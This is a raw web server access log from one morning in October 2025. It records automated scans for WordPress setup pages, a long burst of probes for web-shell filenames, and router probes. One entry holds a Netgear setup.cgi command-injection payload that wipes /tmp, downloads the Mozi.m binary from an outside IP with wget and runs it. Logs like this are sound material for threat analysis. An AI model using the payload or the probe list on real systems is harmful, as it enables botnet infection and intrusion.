3.149.59.26 - - [27/Oct/2025:06:46:00 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xEE\x8CA\xFC\x1E\xD6\xA6\xC3g\xE3d\x87Q\xA8U\xEF\x83\xF6\x22\x89Eu\x16\xF0?\xE8\x85\xAF\x00\xB1\x9B\x8D\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
104.23.223.36 - - [27/Oct/2025:06:47:38 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.49 - - [27/Oct/2025:06:47:47 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
34.208.221.26 - - [27/Oct/2025:06:52:45 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1" "-"
34.208.221.26 - - [27/Oct/2025:06:52:45 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582" "-"
94.74.191.2 - - [27/Oct/2025:06:53:21 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 301 169 "-" "-" "-"
101.32.218.31 - - [27/Oct/2025:07:05:47 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
172.68.10.61 - - [27/Oct/2025:07:09:15 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
162.158.87.58 - - [27/Oct/2025:07:10:55 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
34.248.137.227 - - [27/Oct/2025:07:12:01 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
91.184.244.208 - - [27/Oct/2025:07:12:04 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_5 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5" "147.45.185.25"
62.113.113.43 - - [27/Oct/2025:07:23:37 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0(Linux;Android5.0;SAMSUNGSM-G900FBuild/LRX21T)AppleWebKit/537.36(KHTML,likeGecko)SamsungBrowser/3.0" "147.45.185.25"
62.113.113.43 - - [27/Oct/2025:07:23:39 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0(Linux;Android5.0;SAMSUNGSM-G900FBuild/LRX21T)AppleWebKit/537.36(KHTML,likeGecko)SamsungBrowser/3.0" "147.45.185.25"
104.23.221.48 - - [27/Oct/2025:07:32:33 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
149.34.243.66 - - [27/Oct/2025:07:33:28 +0000] "GET / HTTP/1.0" 301 169 "http://ssairen.site/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" "-"
104.23.223.37 - - [27/Oct/2025:07:33:56 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
205.210.31.15 - - [27/Oct/2025:07:34:43 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xA0h\xF0\x96\xDC\x9C\xCD\x03P\x84\xCC\xF2V>\xD0W\x0E_\x11wt\xA9\xCF\xAB\x99z\x8B\x97$\xE0\xB2t\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-" "-"
205.210.31.15 - - [27/Oct/2025:07:34:43 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xEB\xFC5<\x91\x09\xE7\xA4\x01\xF8\xB0\xAA\x9Cl\xF1\xA8\xEF\xDA\x83/}\xDB \xF9\x15\xAA\xD0\x93\x1D\x8C\xA8} \xA9\x84\x90\xA6\x07\xD3q\x07~h\xCF*\xE3\xB8\x0E\xB9\x11\xEB\xE1\x15\xC8\x16]\x8D\x92\x9FyvE\x08Z\xA5\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-" "-"
172.71.144.49 - - [27/Oct/2025:07:54:08 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.239.81 - - [27/Oct/2025:07:54:33 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
204.76.203.219 - - [27/Oct/2025:07:55:00 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
43.133.139.6 - - [27/Oct/2025:08:10:44 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
172.71.184.156 - - [27/Oct/2025:08:15:31 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.70.248.153 - - [27/Oct/2025:08:18:09 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
91.184.244.208 - - [27/Oct/2025:08:28:51 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/4.0(compatible;MSIE7.0;WindowsNT6.1;WOW64;Trident/5.0;SLCC2;.NETCLR2.0.50727;.NETCLR3.5.30729;.NETCLR3.0.30729;.NET4.0C;.NET4.0E;MediaCenterPC6.0;InfoPath.3;BRI/2)" "147.45.185.25"
172.71.184.35 - - [27/Oct/2025:08:36:58 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.71.144.48 - - [27/Oct/2025:08:39:17 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
74.176.186.150 - - [27/Oct/2025:08:44:35 +0000] "GET /wp-content/plugins/hellopress/wp_filemanager.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:36 +0000] "GET /marijuana.php? HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:36 +0000] "GET /v4.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:36 +0000] "GET /bless.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:36 +0000] "GET /yanz.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:36 +0000] "GET /wp.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:36 +0000] "GET /admin/upload/css.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:36 +0000] "GET /wp-content/plugins/TOPXOH/wDR.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:37 +0000] "GET /wp-includes/autoload_classmap.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:37 +0000] "GET /wp-includes/system_log.php? HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:37 +0000] "GET /upload/wp-info.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:37 +0000] "GET /config.php? HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:37 +0000] "GET /g.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:37 +0000] "GET /makeasmtp.php?p= HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:37 +0000] "GET /marijuana.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:37 +0000] "GET /wp-includes/Text/Diff/Engine/about.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:37 +0000] "GET /.well-known/acme-challenge/admin.php HTTP/1.1" 404 153 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:37 +0000] "GET /11.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:37 +0000] "GET /wp-22.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:38 +0000] "GET /network.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:38 +0000] "GET /system_log.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:38 +0000] "GET /atomlib.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:38 +0000] "GET /ee.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:38 +0000] "GET /license.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:38 +0000] "GET /lv.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:39 +0000] "GET /about/function.php? HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:39 +0000] "GET /wp-content/themes/wp-pridmag/init.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:39 +0000] "GET /build.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:39 +0000] "GET /wp-configs.php? HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:39 +0000] "GET /v.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:39 +0000] "GET /info.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:39 +0000] "GET /wp-includes/assets/index.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:39 +0000] "GET /wp-includes/IXR/admin.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:40 +0000] "GET /.well-known/acme-challenge/index.php HTTP/1.1" 404 153 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:40 +0000] "GET /css/colors/coffee/index.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:40 +0000] "GET /r.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:40 +0000] "GET /1.php? HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:40 +0000] "GET /file.php? HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:40 +0000] "GET /go.php?p= HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:40 +0000] "GET /radio.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:40 +0000] "GET /f35.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:40 +0000] "GET /w.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:40 +0000] "GET /r.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:40 +0000] "GET /wp-includes/html-api/wp-conflg.php?p= HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:41 +0000] "GET /wp-includes/ID3/rk2.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:41 +0000] "GET /wp-cron.php? HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:41 +0000] "GET /gmo.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:41 +0000] "GET /post.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:41 +0000] "GET /about.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:41 +0000] "GET /wp-includes/js/crop/zmFM.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:41 +0000] "GET /as.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:41 +0000] "GET /4.php?p= HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:42 +0000] "GET /bypass.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:42 +0000] "GET /wp-includes/theme-compat/wp-login.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:42 +0000] "GET /xc.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:42 +0000] "GET /lock.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:42 +0000] "GET /alfanew.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:42 +0000] "GET /wp-includes/js/codemirror/index.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:43 +0000] "GET /1.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:43 +0000] "GET //gmo.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:43 +0000] "GET /0.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:43 +0000] "GET /admin.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:43 +0000] "GET /wp-content/themes/wp-pridmag/init.php? HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:44 +0000] "GET /about.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:44 +0000] "GET /NewFile.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:44 +0000] "GET /wp-admin/images/index.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:44 +0000] "GET /manager.php?p= HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:44 +0000] "GET /12.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:44 +0000] "GET /index/fucku.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:45 +0000] "GET /admin.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:45 +0000] "GET /index/function.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:45 +0000] "GET /20.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:45 +0000] "GET /default.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:45 +0000] "GET /2.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:45 +0000] "GET /wp-admin/css/wp-conflg.php?p= HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:45 +0000] "GET /chosen.php? HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:45 +0000] "GET /wp-content/403.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:45 +0000] "GET /a.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:45 +0000] "GET /ee.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:46 +0000] "GET /d2.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:46 +0000] "GET /inputs.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:46 +0000] "GET /wp-admin/user/about.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:46 +0000] "GET /an.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:46 +0000] "GET /wp-2019.php? HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:46 +0000] "GET /css.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:46 +0000] "GET /02.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:46 +0000] "GET /simple.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:46 +0000] "GET /plugins/pwnd/as.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:46 +0000] "GET /wp-includes/rest-api/fields/index.php? HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:47 +0000] "GET /admin/function.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:47 +0000] "GET /lock360.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:47 +0000] "GET /public_html HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:47 +0000] "GET /c.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:47 +0000] "GET /t.php?p= HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:47 +0000] "GET /mail.php? HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:47 +0000] "GET /goat1.php HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:47 +0000] "GET /tiny.php?p= HTTP/1.1" 301 169 "-" "-" "-"
74.176.186.150 - - [27/Oct/2025:08:44:48 +0000] "GET /6.php HTTP/1.1" 301 169 "-" "-" "-"
204.76.203.212 - - [27/Oct/2025:08:45:27 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
162.158.182.93 - - [27/Oct/2025:09:00:15 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.48 - - [27/Oct/2025:09:01:11 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.71.164.134 - - [27/Oct/2025:09:24:11 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.223.37 - - [27/Oct/2025:09:24:51 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
91.184.244.208 - - [27/Oct/2025:09:27:22 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-A9000 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" "147.45.185.25"
20.14.90.84 - - [27/Oct/2025:09:37:32 +0000] "GET /developmentserver/metadatauploader HTTP/1.1" 301 169 "-" "Mozilla/5.0 zgrab/0.x" "-"
104.23.223.37 - - [27/Oct/2025:09:48:18 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.48 - - [27/Oct/2025:09:49:07 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
34.90.31.187 - - [27/Oct/2025:09:50:19 +0000] "\x16\x03\x01\x00M\x01\x00\x00I\x03\x03\xEBO\xF6\x1D\xA2\xC9\xC0\x9Bty\xE1\xE9\x8C\xCA\x5C\x00\xB06\xFD\x9C \xBAm\x05\x9E\xF2\x98\x92\xDC\xC8v\xDD \x16\x90\xC5\xD4\xF1\x1D" 400 157 "-" "-" "-"
34.90.31.187 - - [27/Oct/2025:09:50:21 +0000] "OPTIONS / HTTP/1.0" 301 169 "-" "-" "-"
204.76.203.219 - - [27/Oct/2025:09:50:38 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
103.152.159.234 - - [27/Oct/2025:10:01:27 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.152.159.234:47296/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 169 "-" "-" "-"
162.158.182.92 - - [27/Oct/2025:10:06:39 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.48 - - [27/Oct/2025:10:08:28 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
82.146.44.21 - - [27/Oct/2025:10:18:08 +0000] "GET / HTTP/1.1" 301 169 "-" "OPR/72.0.3815.465 (Edition Yx GX)" "-"
104.23.223.37 - - [27/Oct/2025:10:31:55 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.68.10.61 - - [27/Oct/2025:10:32:28 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
94.74.191.2 - - [27/Oct/2025:10:33:11 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 301 169 "-" "-" "-"
62.113.113.43 - - [27/Oct/2025:10:33:31 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2_2 like Mac OS X; nl-nl) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B500 Safari/531.21.10" "147.45.185.25"
62.113.113.43 - - [27/Oct/2025:10:33:34 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2_2 like Mac OS X; nl-nl) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B500 Safari/531.21.10" "147.45.185.25"
185.242.226.112 - - [27/Oct/2025:10:36:59 +0000] "\x16\x03\x01\x00\x8A\x01\x00\x00\x86\x03\x03\xCA\x9D)\xE8\x97M4\xE3\xCC\x05&\xE7,\x84a&\x12b7\xBC\xFA\x8FWrW\x98fG\xF9\xD8\xBBd\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
104.23.221.49 - - [27/Oct/2025:10:53:43 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.223.37 - - [27/Oct/2025:10:53:57 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
57.151.97.194 - - [27/Oct/2025:11:06:20 +0000] "MGLNDD_15.165.17.52_80" 400 157 "-" "-" "-"
54.246.143.208 - - [27/Oct/2025:11:12:02 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Kubuntu; Linux i686; rv:132.0) Gecko/20100101 Firefox/132.0" "-"
54.246.143.208 - - [27/Oct/2025:11:12:07 +0000] "\x16\x03\x01\x05\xE1\x01\x00\x05\xDD\x03\x03\xFF\xAF\xC5\x80/\x93\xB9\xBB(\xCB\x06 \x0C'\xA6\xCE\xFE\xE0\x15;\x97R\xC7\xED\x17\xDE\x11e\xEE\xED\xB64 \x7F\xDC={:XiPQ\xF5b`\x89\xA2\xBC\x93\xED*{ Y\x1B\xF9\x96\xFBuP\xAF\x0C\xC84\x10\x002\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-" "-"
147.185.132.92 - - [27/Oct/2025:11:14:14 +0000] "GET / HTTP/1.1" 301 169 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity" "-"
